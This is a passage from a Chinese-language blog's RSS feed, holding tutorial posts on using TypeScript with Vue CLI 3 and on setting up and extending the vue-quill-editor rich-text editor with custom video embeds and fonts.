<h3 id="工具转换前后对比" tabindex="-1"> 工具转换前后对比</h3>
<p><img src="/assets/react-to-vue.jpg" alt="react-to-vue"></p>
<p>上述的转换只是用来转换 React 页面的, 但是并不能转换 React 中的路由管理和状态管理, 这些需要我们自己实现其相同逻辑</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/react-life-cycle-old.png" type="image/png"/>
    </item>
    <item>
      <title>vue 全家桶结合 TypeScript</title>
      <link>https://vxhly.github.io/views/vuejs/usage-typescript-in-vue-family-bucket.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-typescript-in-vue-family-bucket.html</guid>
      <source url="https://vxhly.github.io/rss.xml">vue 全家桶结合 TypeScript</source>
      <description>前言
自从 vue cli 升级到 3.0 之后, vue 项目对 TypeScript 的支持度也不断的提升, 为了更好的学习 TypeScript, 本篇文章记录着 vue 全家桶结合 TypeScript 的食用方式。

</description>
      <category>vuejs</category>
      <pubDate>Sun, 23 Sep 2018 15:19:43 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>自从 vue cli 升级到 3.0 之后, vue 项目对 TypeScript 的支持度也不断的提升, 为了更好的学习 TypeScript, 本篇文章记录着 vue 全家桶结合 TypeScript 的食用方式。</p>
</div>

<h2 id="vue-cli-3-0" tabindex="-1"> vue-cli 3.0</h2>
<h3 id="cli-工具到底升级了什么" tabindex="-1"> cli 工具到底升级了什么</h3>
<ul>
<li>GUI 项目管理界面</li>
<li>更加简洁的目录结构</li>
<li>TypeScript 的支持</li>
<li>Git Hook 提交 commit 的时候检查代码的规范性</li>
<li>依赖和插件管理更加方便(GUI 管理)</li>
<li>Progressive Web App 的支持</li>
<li>Vue Router &amp; Vuex</li>
<li>ESLint / TSLint / Prettier</li>
<li>用 Jest 或 Mocha 进行单元测试</li>
<li>用 Cypress 或者 Nightwatch 进行 E2E 测试</li>
<li>预配置 webpack 功能, 如模块热替换、代码拆分、 摇树优化（tree-shaking）、高效持久化缓存等</li>
<li>通过 Babel 7 + preset-env（Babel 插件）对 ES2017 进行转换和基于使用情况注入 polyfill</li>
<li>支持 PostCSS（默认启用 autoprefixer）和所有主要的 CSS 预处理器</li>
</ul>
<h3 id="安装" tabindex="-1"> 安装</h3>
<div><pre><code><span>npm</span> i -g @vue/cli
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="创建项目" tabindex="-1"> 创建项目</h3>
<div><pre><code>vue create <span>[</span>productName<span>]</span>
<span># or</span>
vue ui
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>在选方案时, 记得把 TypeScript 的支持勾选</p>
<h2 id="typescript" tabindex="-1"> TypeScript</h2>
<p>TypeScript 是一种由微软开发的自由和开源的编程语言。它是 JavaScript 的一个超集, 而且本质上向这个语言添加了可选的静态类型和基于类的面向对象编程. TypeScript 扩展了 JavaScript 语法, 任何已经存在的 JavaScript 程序, 可以不加任何改动, 在 TypeScript 环境下运行。TypeScript 只是向 JavaScript 添加了一些新的遵循 ES6 规范的语法, 以及基于类的面向对象编程的这种特性。</p>
<h2 id="在项目中食用-typescript" tabindex="-1"> 在项目中食用 TypeScript</h2>
<h3 id="vue" tabindex="-1"> vue</h3>
<h4 id="data" tabindex="-1"> data</h4>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
  <span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
  <span>import</span> Component <span>from</span> <span>"vue-class-component"</span><span>;</span>

  @Component
  <span>export</span> <span>default</span> <span>class</span> <span>App</span> <span>extends</span> <span>Vue</span> <span>{</span>
    <span>msg1</span><span>:</span> number <span>=</span> <span>123</span><span>;</span>
    <span>msg2</span><span>:</span> String <span>=</span> <span>"hello word"</span><span>;</span>
    <span>obj</span><span>:</span> Object <span>=</span> <span>{</span>
      <span>msg1</span><span>:</span> <span>123</span><span>,</span>
      <span>msg2</span><span>:</span> <span>"hello word"</span><span>,</span>
    <span>}</span><span>;</span>
    <span>arr</span><span>:</span> Array <span>=</span> <span>[</span><span>123</span><span>,</span> <span>"hello word"</span><span>]</span><span>;</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>======&gt;</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"App"</span><span>,</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>msg1</span><span>:</span> <span>123</span><span>,</span>
        <span>msg2</span><span>:</span> <span>"hello word"</span><span>,</span>
        <span>obj</span><span>:</span> <span>{</span>
          <span>msg1</span><span>:</span> <span>123</span><span>,</span>
          <span>msg2</span><span>:</span> <span>"hello word"</span><span>,</span>
        <span>}</span><span>,</span>
        <span>arr</span><span>:</span> <span>[</span><span>123</span><span>,</span> <span>"hello word"</span><span>]</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="watch" tabindex="-1"> watch</h4>
<div><p>提示</p>
<p>@Watch(path: string, options: WatchOptions = {})</p>
</div>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
  <span>import</span> <span>{</span> Vue<span>,</span> Component<span>,</span> Watch <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>

  @Component
  <span>export</span> <span>default</span> <span>class</span> <span>YourComponent</span> <span>extends</span> <span>Vue</span> <span>{</span>
    @<span>Watch</span><span>(</span><span>"child"</span><span>)</span>
    <span>onChildChanged</span><span>(</span><span><span>val</span><span>:</span> string<span>,</span> <span>oldVal</span><span>:</span> string</span><span>)</span> <span>{</span><span>}</span>

    @<span>Watch</span><span>(</span><span>"person"</span><span>,</span> <span>{</span>
      <span>immediate</span><span>:</span> <span>true</span><span>,</span>
      <span>deep</span><span>:</span> <span>true</span><span>,</span>
    <span>}</span><span>)</span>
    <span>onPersonChanged</span><span>(</span><span><span>val</span><span>:</span> Person<span>,</span> <span>oldVal</span><span>:</span> Person</span><span>)</span> <span>{</span><span>}</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>======&gt;</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>export</span> <span>default</span> <span>{</span>
    <span>watch</span><span>:</span> <span>{</span>
      <span>child</span><span>:</span> <span>{</span>
        <span>handler</span><span>:</span> <span>"onChildChanged"</span><span>,</span>
        <span>immediate</span><span>:</span> <span>false</span><span>,</span>
        <span>deep</span><span>:</span> <span>false</span><span>,</span>
      <span>}</span><span>,</span>
      <span>person</span><span>:</span> <span>{</span>
        <span>handler</span><span>:</span> <span>"onPersonChanged"</span><span>,</span>
        <span>immediate</span><span>:</span> <span>true</span><span>,</span>
        <span>deep</span><span>:</span> <span>true</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>methods</span><span>:</span> <span>{</span>
      <span>onChildChanged</span><span>(</span><span>val<span>,</span> oldVal</span><span>)</span> <span>{</span><span>}</span><span>,</span>
      <span>onPersonChanged</span><span>(</span><span>val<span>,</span> oldVal</span><span>)</span> <span>{</span><span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="vuex" tabindex="-1"> vuex</h3>
<h3 id="axios" tabindex="-1"> axios</h3>
<h4 id="需要安装描述文件" tabindex="-1"> 需要安装描述文件</h4>
<div><pre><code><span>yarn</span> <span>add</span> -D @types/axios
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="一个栗子" tabindex="-1"> 一个栗子</h4>
<p><code>config.ts</code></p>
<div><pre><code><span>const</span> <span>serverURL</span><span>:</span> String <span>=</span> <span>"http://127.0.0.1:8090/api"</span><span>;</span>
<span>export</span> <span>{</span> serverURL <span>as</span> url <span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p><code>axios.ts</code></p>
<div><pre><code><span>import</span> axios <span>from</span> <span>"axios"</span><span>;</span>
<span>import</span> <span>{</span> url <span>}</span> <span>from</span> <span>"@/config"</span><span>;</span>

<span>const</span> protocol <span>=</span> window<span>.</span>location<span>.</span>protocol<span>;</span>
<span>const</span> host <span>=</span> window<span>.</span>location<span>.</span>host<span>;</span>
<span>const</span> domain <span>=</span> document<span>.</span>domain<span>;</span>
<span>let</span> <span>serverURL</span><span>:</span> any <span>=</span> <span>""</span><span>;</span>

<span>if</span> <span>(</span>domain <span>===</span> <span>"127.0.0.1"</span> <span>||</span> domain <span>===</span> <span>"localhost"</span><span>)</span> <span>{</span>
  serverURL <span>=</span> url<span>;</span>
<span>}</span> <span>else</span> <span>{</span>
  serverURL <span>=</span> <span><span>`</span><span><span>${</span>protocol<span>}</span></span><span>`</span></span> <span>+</span> <span>"//"</span> <span>+</span> <span><span>`</span><span><span>${</span>host<span>}</span></span><span>:8090/api</span><span>`</span></span><span>;</span>
<span>}</span>

<span>// 创建 axios 实例</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>{</span>
  <span>baseURL</span><span>:</span> serverURL<span>,</span>
  <span>timeout</span><span>:</span> <span>0</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> instance<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在 vue.js 中使用 vue-quill-editor 富文本编辑器</title>
      <link>https://vxhly.github.io/views/vuejs/usage-vue-quill-editor-in-vue-js.html</link>
      <guid>https://vxhly.github.io/views/vuejs/usage-vue-quill-editor-in-vue-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在 vue.js 中使用 vue-quill-editor 富文本编辑器</source>
      <description>前言
富文本编辑器在后台管理系统中是一个常见而又简单的需求, 这里介绍到的是在 vue.js 项目中使用 vue-quill-editor 这一款富文本编辑器。

</description>
      <category>vuejs</category>
      <pubDate>Wed, 19 Aug 2020 14:38:09 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>富文本编辑器在后台管理系统中是一个常见而又简单的需求, 这里介绍到的是在 vue.js 项目中使用 vue-quill-editor 这一款富文本编辑器。</p>
</div>

<h2 id="vue-quill-editor" tabindex="-1"> vue-quill-editor</h2>
<p>至于这款编辑器并不想做过多的介绍, 本文是致力于收集网上一些关于这个编辑器的使用方法（毕竟 <code>quilljs</code> 官网挂了, 所以很多的 API 使用全部看不到官方的说明）</p>
<div><p>相关链接</p>
<p>上官方的演示地址 <a href="https://github.surmon.me/vue-quill-editor/" target="_blank" rel="noopener noreferrer">vue-quill-editor</a> 官方文档(ps: 官方文档好像挂了进不去, 翻墙也进不去)：<a href="https://quilljs.com/docs/quickstart/" target="_blank" rel="noopener noreferrer">Quill API document</a> 社区中文文档：<a href="https://kang-bing-kui.gitbook.io/quill/" target="_blank" rel="noopener noreferrer">Quill 中文文档</a></p>
</div>
<h2 id="下载安装" tabindex="-1"> 下载安装</h2>
<div><pre><code><span>npm</span> <span>install</span> vue-quill-editor --save
<span># or</span>
<span>yarn</span> <span>add</span> vue-quill-editor
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="全局安装" tabindex="-1"> 全局安装</h3>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> VueQuillEditor <span>from</span> <span>"vue-quill-editor"</span><span>;</span>

<span>import</span> <span>"quill/dist/quill.core.css"</span><span>;</span> <span>// import styles</span>
<span>import</span> <span>"quill/dist/quill.snow.css"</span><span>;</span> <span>// for snow theme</span>
<span>import</span> <span>"quill/dist/quill.bubble.css"</span><span>;</span> <span>// for bubble theme</span>

Vue<span>.</span><span>use</span><span>(</span>VueQuillEditor <span>/* { default global options } */</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="局部安装" tabindex="-1"> 局部安装</h3>
<div><pre><code><span>import</span> <span>"quill/dist/quill.core.css"</span><span>;</span> <span>// import styles</span>
<span>import</span> <span>"quill/dist/quill.snow.css"</span><span>;</span> <span>// for snow theme</span>
<span>import</span> <span>"quill/dist/quill.bubble.css"</span><span>;</span> <span>// for bubble theme</span>

<span>import</span> <span>{</span> quillEditor <span>}</span> <span>from</span> <span>"vue-quill-editor"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>components</span><span>:</span> <span>{</span>
    quillEditor<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="使用" tabindex="-1"> 使用</h2>
<h3 id="一个简单的例子" tabindex="-1"> 一个简单的例子</h3>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>quill-editor</span>
    <span>ref</span><span><span>=</span><span>"</span>myQuillEditor<span>"</span></span>
    <span>v-model</span><span><span>=</span><span>"</span>content<span>"</span></span>
    <span>:options</span><span><span>=</span><span>"</span>editorOption<span>"</span></span>
    <span>@change</span><span><span>=</span><span>"</span>onEditorChange<span>"</span></span>
    <span>@blur</span><span><span>=</span><span>"</span>onEditorBlur($event)<span>"</span></span>
    <span>@focus</span><span><span>=</span><span>"</span>onEditorFocus($event)<span>"</span></span>
    <span>@ready</span><span><span>=</span><span>"</span>onEditorReady($event)<span>"</span></span>
  <span>/></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> <span>"quill/dist/quill.core.css"</span><span>;</span> <span>// import styles</span>
<span>import</span> <span>"quill/dist/quill.snow.css"</span><span>;</span> <span>// for snow theme</span>
<span>import</span> <span>"quill/dist/quill.bubble.css"</span><span>;</span> <span>// for bubble theme</span>

<span>import</span> <span>{</span> quillEditor <span>}</span> <span>from</span> <span>"vue-quill-editor"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>components</span><span>:</span> <span>{</span>
    quillEditor<span>,</span>
  <span>}</span><span>,</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>content</span><span>:</span> <span>""</span><span>,</span>
      <span>editorOption</span><span>:</span> <span>{</span>
        <span>// Some Quill options...</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>onEditorBlur</span><span>(</span><span>quill</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"editor blur!"</span><span>,</span> quill<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>onEditorFocus</span><span>(</span><span>quill</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"editor focus!"</span><span>,</span> quill<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>onEditorReady</span><span>(</span><span>quill</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"editor ready!"</span><span>,</span> quill<span>)</span><span>;</span>
    <span>}</span><span>,</span>
    <span>onEditorChange</span><span>(</span><span><span>{</span> quill<span>,</span> html<span>,</span> text <span>}</span></span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"editor change!"</span><span>,</span> quill<span>,</span> html<span>,</span> text<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="二次封装" tabindex="-1"> 二次封装</h2>
<div><p>场景一</p>
<p>默认的 vue-quill-editor 是采用 iframe 来嵌入视频的, 我们现需要修改成用 H5 的 video</p>
</div>
<p>准备一个 <code>video.js</code> 文件</p>
<div><pre><code><span>import</span> <span>{</span> Quill <span>}</span> <span>from</span> <span>"vue-quill-editor"</span><span>;</span>

<span>// 源码中是import直接倒入, 这里要用Quill.import引入</span>
<span>const</span> BlockEmbed <span>=</span> Quill<span>.</span><span>import</span><span>(</span><span>"blots/block/embed"</span><span>)</span><span>;</span>
<span>const</span> Link <span>=</span> Quill<span>.</span><span>import</span><span>(</span><span>"formats/link"</span><span>)</span><span>;</span>

<span>const</span> <span>ATTRIBUTES</span> <span>=</span> <span>[</span><span>"height"</span><span>,</span> <span>"width"</span><span>]</span><span>;</span>

<span>class</span> <span>Video</span> <span>extends</span> <span>BlockEmbed</span> <span>{</span>
  <span>static</span> <span>create</span><span>(</span><span>value</span><span>)</span> <span>{</span>
    <span>const</span> node <span>=</span> <span>super</span><span>.</span><span>create</span><span>(</span>value<span>)</span><span>;</span>
    <span>// 添加video标签所需的属性</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"controls"</span><span>,</span> <span>"controls"</span><span>)</span><span>;</span> <span>// 控制播放器</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"type"</span><span>,</span> <span>"video/mp4"</span><span>)</span><span>;</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"style"</span><span>,</span> <span>"object-fit:fill;width: 100%;"</span><span>)</span><span>;</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"preload"</span><span>,</span> <span>"auto"</span><span>)</span><span>;</span> <span>// auto - 当页面加载后载入整个视频  meta - 当页面加载后只载入元数据  none - 当页面加载后不载入视频</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"webkit-playsinline"</span><span>,</span> <span>"true"</span><span>)</span><span>;</span> <span>// 兼容ios 不全屏播放</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"playsinline"</span><span>,</span> <span>"true"</span><span>)</span><span>;</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"x-webkit-airplay"</span><span>,</span> <span>"allow"</span><span>)</span><span>;</span>
    <span>// node.setAttribute('x5-video-player-type', 'h5') // 启用H5播放器,是wechat安卓版特性</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"x5-video-orientation"</span><span>,</span> <span>"portraint"</span><span>)</span><span>;</span> <span>// 竖屏播放 声明了h5才能使用  播放器支付的方向, landscape横屏, portraint竖屏, 默认值为竖屏</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"x5-playsinline"</span><span>,</span> <span>"true"</span><span>)</span><span>;</span> <span>// 兼容安卓 不全屏播放</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"x5-video-player-fullscreen"</span><span>,</span> <span>"true"</span><span>)</span><span>;</span> <span>// 全屏设置, 设置为 true 是防止横屏</span>
    node<span>.</span><span>setAttribute</span><span>(</span><span>"src"</span><span>,</span> <span>this</span><span>.</span><span>sanitize</span><span>(</span>value<span>)</span><span>)</span><span>;</span>
    <span>return</span> node<span>;</span>
  <span>}</span>

  <span>static</span> <span>formats</span><span>(</span><span>domNode</span><span>)</span> <span>{</span>
    <span>return</span> <span>ATTRIBUTES</span><span>.</span><span>reduce</span><span>(</span><span>(</span><span>formats<span>,</span> attribute</span><span>)</span> <span>=></span> <span>{</span>
      <span>if</span> <span>(</span>domNode<span>.</span><span>hasAttribute</span><span>(</span>attribute<span>)</span><span>)</span> <span>{</span>
        formats<span>[</span>attribute<span>]</span> <span>=</span> domNode<span>.</span><span>getAttribute</span><span>(</span>attribute<span>)</span><span>;</span>
      <span>}</span>
      <span>return</span> formats<span>;</span>
    <span>}</span><span>,</span> <span>{</span><span>}</span><span>)</span><span>;</span>
  <span>}</span>

  <span>static</span> <span>sanitize</span><span>(</span><span>url</span><span>)</span> <span>{</span>
    <span>return</span> Link<span>.</span><span>sanitize</span><span>(</span>url<span>)</span><span>;</span> <span>// eslint-disable-line import/no-named-as-default-member</span>
  <span>}</span>

  <span>static</span> <span>value</span><span>(</span><span>domNode</span><span>)</span> <span>{</span>
    <span>return</span> domNode<span>.</span><span>getAttribute</span><span>(</span><span>"src"</span><span>)</span><span>;</span>
  <span>}</span>

  <span>format</span><span>(</span><span>name<span>,</span> value</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>ATTRIBUTES</span><span>.</span><span>indexOf</span><span>(</span>name<span>)</span> <span>></span> <span>-</span><span>1</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>value<span>)</span> <span>{</span>
        <span>this</span><span>.</span>domNode<span>.</span><span>setAttribute</span><span>(</span>name<span>,</span> value<span>)</span><span>;</span>
      <span>}</span> <span>else</span> <span>{</span>
        <span>this</span><span>.</span>domNode<span>.</span><span>removeAttribute</span><span>(</span>name<span>)</span><span>;</span>
      <span>}</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>super</span><span>.</span><span>format</span><span>(</span>name<span>,</span> value<span>)</span><span>;</span>
    <span>}</span>
  <span>}</span>

  <span>html</span><span>(</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> video <span>}</span> <span>=</span> <span>this</span><span>.</span><span>value</span><span>(</span><span>)</span><span>;</span>
    <span>return</span> <span><span>`</span><span>&lt;a href="</span><span><span>${</span>video<span>}</span></span><span>"></span><span><span>${</span>video<span>}</span></span><span>&lt;/a></span><span>`</span></span><span>;</span>
  <span>}</span>
<span>}</span>
Video<span>.</span>blotName <span>=</span> <span>"video"</span><span>;</span> <span>// 这里不用改, 楼主不用iframe, 直接替换掉原来, 如果需要也可以保留原来的, 这里用个新的blot</span>
Video<span>.</span>className <span>=</span> <span>"ql-video"</span><span>;</span>
Video<span>.</span>tagName <span>=</span> <span>"video"</span><span>;</span> <span>// 用video标签替换iframe</span>

<span>export</span> <span>default</span> Video<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>然后在上一节的例子之中添加以下代码</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> <span>{</span> quillEditor<span>,</span> Quill <span>}</span> <span>from</span> <span>"vue-quill-editor"</span><span>;</span>
<span>import</span> Video <span>from</span> <span>"./video.js"</span><span>;</span>

Quill<span>.</span><span>register</span><span>(</span>Video<span>,</span> <span>true</span><span>)</span><span>;</span> <span>// 插入线上视频</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>components</span><span>:</span> <span>{</span>
    quillEditor<span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>场景二</p>
<p>默认的 vue-quill-editor 配置的字体样式比较少, 我们需要额外的添加几种字体</p>
</div>
<p>上一节的例子之中添加以下代码</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> <span>{</span> quillEditor<span>,</span> Quill <span>}</span> <span>from</span> <span>"vue-quill-editor"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>// 额外配置的字体</span>
    <span>const</span> fonts <span>=</span> <span>[</span>
      <span>"SimSun"</span><span>,</span>
      <span>"SimHei"</span><span>,</span>
      <span>"Microsoft-YaHei"</span><span>,</span>
      <span>"KaiTi"</span><span>,</span>
      <span>"FangSong"</span><span>,</span>
      <span>"Arial"</span><span>,</span>
      <span>"Times-New-Roman"</span><span>,</span>
      <span>"sans-serif"</span><span>,</span>
    <span>]</span><span>;</span>
    <span>const</span> Font <span>=</span> Quill<span>.</span><span>import</span><span>(</span><span>"formats/font"</span><span>)</span><span>;</span>
    Font<span>.</span>whitelist <span>=</span> fonts<span>;</span> <span>// 将字体加入到白名单</span>
    Quill<span>.</span><span>register</span><span>(</span>Font<span>,</span> <span>true</span><span>)</span><span>;</span>

    <span>return</span> <span>{</span>
      <span>editorOption</span><span>:</span> <span>{</span>
        <span>modules</span><span>:</span> <span>{</span>
          <span>toolbar</span><span>:</span> <span>{</span>
            <span>container</span><span>:</span> <span>[</span>
              <span>[</span><span>{</span> <span>font</span><span>:</span> fonts <span>}</span><span>]</span><span>,</span> <span>// 字体</span>
            <span>]</span><span>,</span>
          <span>}</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>

<span><span><span>&lt;</span>style</span><span>></span></span><span><span>
<span>/* 额外的配置字体 */</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="SimSun"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="SimSun"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"宋体"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"SimSun"</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="SimHei"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="SimHei"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"黑体"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"SimHei"</span><span>;</span>
<span>}</span>
<span>.ql-snow
  .ql-picker.ql-font
  .ql-picker-label[data-value="Microsoft-YaHei"]::before,
.ql-snow
  .ql-picker.ql-font
  .ql-picker-item[data-value="Microsoft-YaHei"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"微软雅黑"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"Microsoft YaHei"</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="KaiTi"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="KaiTi"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"楷体"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"KaiTi"</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="FangSong"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="FangSong"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"仿宋"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"FangSong"</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="Arial"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="Arial"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"Arial"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"Arial"</span><span>;</span>
<span>}</span>
<span>.ql-snow
  .ql-picker.ql-font
  .ql-picker-label[data-value="Times-New-Roman"]::before,
.ql-snow
  .ql-picker.ql-font
  .ql-picker-item[data-value="Times-New-Roman"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"Times New Roman"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"Times New Roman"</span><span>;</span>
<span>}</span>
<span>.ql-snow .ql-picker.ql-font .ql-picker-label[data-value="sans-serif"]::before,
.ql-snow .ql-picker.ql-font .ql-picker-item[data-value="sans-serif"]::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>"sans-serif"</span><span>;</span>
  <span>font-family</span><span>:</span> <span>"sans-serif"</span><span>;</span>
<span>}</span>

<span>.ql-font-SimSun</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"SimSun"</span><span>;</span>
<span>}</span>
<span>.ql-font-SimHei</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"SimHei"</span><span>;</span>
<span>}</span>
<span>.ql-font-Microsoft-YaHei</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"Microsoft YaHei"</span><span>;</span>
<span>}</span>
<span>.ql-font-KaiTi</span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"KaiTi"</span><span>;</span>
<span>}</span>
<span>.ql-font-FangSong</span> <span>{</span>
